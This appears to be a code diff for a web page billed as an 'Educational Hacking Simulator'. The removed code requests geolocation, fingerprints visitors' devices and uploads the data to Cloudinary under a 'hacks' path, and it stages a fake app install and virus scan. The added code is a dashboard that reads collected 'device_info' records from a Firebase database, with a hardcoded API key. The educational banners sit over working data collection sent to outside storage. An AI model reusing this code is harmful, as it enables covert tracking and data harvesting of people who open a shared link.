-                                statusIndicator.textContent = 'Permission Denied';
-                                statusIndicator.className = 'status error';
-                            },
-                             {
-                                 enableHighAccuracy: true, // Request more accurate location
-                                 timeout: 5000,           // Timeout after 5 seconds
-                                 maximumAge: 0            // Don't use cached location
-                             }
-                        );
-                    } else {
-                         appendResult('Geolocation is not supported by this browser.');
-                         statusIndicator.textContent = 'Feature Unsupported';
-                         statusIndicator.className = 'status error';
-                    }
-                    break;
-
-                case 'callLogs':
-                     appendResult(` EDUCATIONAL CONTENT:
-! Browser JavaScript cannot access your device's call logs for security reasons.
-! This simulation highlights app permissions. Malicious *mobile apps* might request call log access.
-! This reveals who you communicate with and when.
-! Never grant unnecessary permissions to apps.
-! Regularly review app permissions in settings.`);
-
-                     appendResult(`Simulating call log access attempt (blocked by browser security)...`);
-                    break;
-
-                case 'deviceInfo':
-                     appendResult('Collecting device information...');
-                     cameraFeedDiv.style.display = "none"; // Hide camera feed area
-
-                    const deviceInfo = {
-                        userAgent: navigator.userAgent,
-                        platform: navigator.platform,
-                        language: navigator.language,
-                        cookiesEnabled: navigator.cookieEnabled,
-                        screen: `${screen.width}x${screen.height}`,
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        cores: navigator.hardwareConcurrency || "unknown",
-                        deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "unknown",
-                         online: navigator.onLine,
-                         vendor: navigator.vendor,
-                         maxTouchPoints: navigator.maxTouchPoints || 0
-                    };
-
-                    const deviceInfoText = `Device Information:\n` +
-                                           `User Agent: ${deviceInfo.userAgent}\n` +
-                                           `Platform: ${deviceInfo.platform}\n` +
-                                           `Language: ${deviceInfo.language}\n` +
-                                           `Cookies Enabled: ${deviceInfo.cookiesEnabled}\n` +
-                                           `Screen Resolution: ${deviceInfo.screen}\n` +
-                                           `Timezone: ${deviceInfo.timezone}\n` +
-                                           `CPU Cores: ${deviceInfo.cores}\n` +
-                                           `Device Memory: ${deviceInfo.deviceMemory}\n` +
-                                            `Online: ${deviceInfo.online}\n` +
-                                            `Vendor: ${deviceInfo.vendor}\n` +
-                                            `Max Touch Points: ${deviceInfo.maxTouchPoints}`;
-
-
-                    appendResult('Collected device information:');
-                    appendResult(deviceInfoText);
-
-                     // Upload the device info data to Cloudinary
-                    const deviceInfoBlob = new Blob([deviceInfoText], { type: 'text/plain' });
-                    const deviceInfoFilename = `device_info_${uniqueId}.txt`;
-                     await uploadToCloudinary(deviceInfoBlob, `hacks/deviceInfo/${uniqueId}`, 'raw');
-
-
-                     appendResult(` EDUCATIONAL CONTENT:
-! Websites can collect information about your device configuration.
-! This data can be used for browser fingerprinting and tracking.
-! Use privacy-focused browsers and extensions to limit data exposure.
-! Consider using VPNs to mask your IP and location.`);
-
-                    break;
-            }
-
-             // Update status after specific hack logic runs
-             statusIndicator.textContent = 'Simulation Complete';
-             statusIndicator.className = 'status';
-
-        }
-
-
-        // Copy to clipboard function
-        function copyToClipboard() {
-            const text = uniqueLinkText.textContent;
-            navigator.clipboard.writeText(text).then(() => {
-                const copyBtn = document.querySelector('.copy-btn');
-                const originalText = copyBtn.innerHTML;
-                copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
-                setTimeout(() => {
-                    copyBtn.innerHTML = originalText;
-                }, 2000);
-            }).catch(err => {
-                 console.error('Failed to copy text: ', err);
-                 alert('Failed to copy link.');
+  <header><i class="fas fa-mobile-alt me-2"></i>Device Info Viewer</header>
+  <div class="container" id="deviceContainer"></div>
+
+  <script>
+    // Firebase Configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyDM4GcdbxyWXheAY1hOi-zJ_KIEe15eJiI",
+      authDomain: "logintyp.firebaseapp.com",
+      databaseURL: "https://logintyp-default-rtdb.firebaseio.com",
+      projectId: "logintyp",
+      storageBucket: "logintyp.firebasestorage.app",
+      messagingSenderId: "974615084842",
+      appId: "1:974615084842:web:dd4c08b27b53d64881a853"
+    };
+
+    // Initialize Firebase and handle errors
+    let db;
+    try {
+      firebase.initializeApp(firebaseConfig);
+      db = firebase.database();
+    } catch (error) {
+      console.error('Firebase initialization error:', error);
+      document.getElementById('deviceContainer').innerHTML = 
+        '<div class="card"><p class="text-center">Error initializing Firebase: ' + error.message + '</p></div>';
+    }
+
+    const deviceContainer = document.getElementById("deviceContainer");
+
+    // Fetch and display device info
+    function loadDeviceInfo() {
+      if (!db) return; // Exit if database initialization failed
+
+      deviceContainer.innerHTML = '<div class="card"><p class="text-center">Loading...</p></div>';
+
+      try {
+        db.ref('device_info').on('value', (snapshot) => {
+          const data = snapshot.val();
+          deviceContainer.innerHTML = '';
+
+          if (data) {
+            Object.entries(data).forEach(([id, device]) => {
+              const deviceJson = JSON.stringify(device, null, 2);
+              const card = document.createElement('div');
+              card.className = 'card';
+              card.innerHTML = `
+                <h3><i class="fas fa-mobile me-2"></i>${device.model || 'N/A'} (${device.brand || 'N/A'})</h3>
+                <p><strong>OS:</strong> ${device.os || 'N/A'}</p>
+                <p><strong>Version:</strong> ${device.version || 'N/A'}</p>
+                <p><strong>Screen Size:</strong> ${device.screenSize || 'N/A'}</p>
+                <button class="toggle-btn"><i class="fas fa-code me-2"></i>Show JSON Data</button>
+                <div class="section-content">${deviceJson}</div>
+              `;
+
+              const toggleBtn = card.querySelector('.toggle-btn');
+              const sectionContent = card.querySelector('.section-content');
+              toggleBtn.addEventListener('click', () => {
+                const show = sectionContent.style.display === 'block';
+                sectionContent.style.display = show ? 'none' : 'block';
+                toggleBtn.innerHTML = show 
+                  ? '<i class="fas fa-code me-2"></i>Show JSON Data' 
+                  : '<i class="fas fa-eye-slash me-2"></i>Hide JSON Data';
+              });
+
+              deviceContainer.appendChild(card);
             });
-        }
-
-        // Simulate download
-        function simulateDownload() {
-             // Stop any ongoing camera process
-             stopCamera();
-
-            resultContent.innerHTML =
-`> Starting security application download simulation...
-> Connecting to Cloudinary storage (simulated)...
-> Downloading: security_app_simulation.apk
-> Size: 24.7 MB
-> Download progress: [████████████████████] 100%
-> Installing simulated security application...
-> Granting permissions: Camera, Location, Contacts, Storage
-> Security shield activated!
-
-> EDUCATIONAL CONTENT:
-! Only download apps from trusted sources like official app stores.
-! Review app permissions before installation carefully.
-! Security apps can help protect your device, but check their permissions too!
-! Keep your operating system and security software updated regularly.`;
-
-            statusIndicator.textContent = "App Installed (Simulated)";
-            statusIndicator.className = "status";
-
-            // Show antivirus panel
-            setTimeout(() => {
-                antivirusPanel.classList.add('active');
-            }, 1000);
-        }
-
-        // Run virus scan
-        function runVirusScan() {
-            const threatList = document.querySelectorAll('.threat-status');
-            threatList.forEach(item => item.textContent = "Scanning...");
-
-            resultContent.innerHTML += `\n> Running full system scan (simulated)...`;
-
-            setTimeout(() => {
-                threatList.forEach(item => item.textContent = "Blocked");
-
-                resultContent.innerHTML +=
-`\n> Scanning 24789 files...
-> Threats detected: 0
-> Your device is secure!`;
-                 resultContent.scrollTop = resultContent.scrollHeight; // Scroll to bottom
-            }, 1500);
-        }
-
-        // Toggle antivirus panel
-        function toggleAntivirusPanel() {
-            antivirusPanel.classList.toggle('active');
-        }
-
-        // Handle cleanup when the page is closed or navigated away
-        window.addEventListener('beforeunload', stopCamera);
-
-
-        // Initialization
-        document.addEventListener('DOMContentLoaded', () => {
-            console.log("Educational Hacking Simulator Loaded");
-            console.log("This tool is for educational purposes only");
-            console.log("It demonstrates browser permission requests and data uploads to Cloudinary (using an insecure method for demo).");
-            console.log("No actual hacking is performed.");
+          } else {
+            deviceContainer.innerHTML = '<div class="card"><p class="text-center">No device info found</p></div>';
+          }
+        }, (error) => {
+          console.error('Error fetching device info:', error);
+          deviceContainer.innerHTML = 
+            '<div class="card"><p class="text-center">Error fetching device info: ' + error.message + '</p></div>';
         });
-    </script>
+      } catch (error) {
+        console.error('Error setting up database listener:', error);
+        deviceContainer.innerHTML = 
+          '<div class="card"><p class="text-center">Error: ' + error.message + '</p></div>';
+      }
+    }
+
+    // Initialize
+    document.addEventListener('DOMContentLoaded', () => {
+      loadDeviceInfo();
+    });
+  </script>
 </body>
 </html>
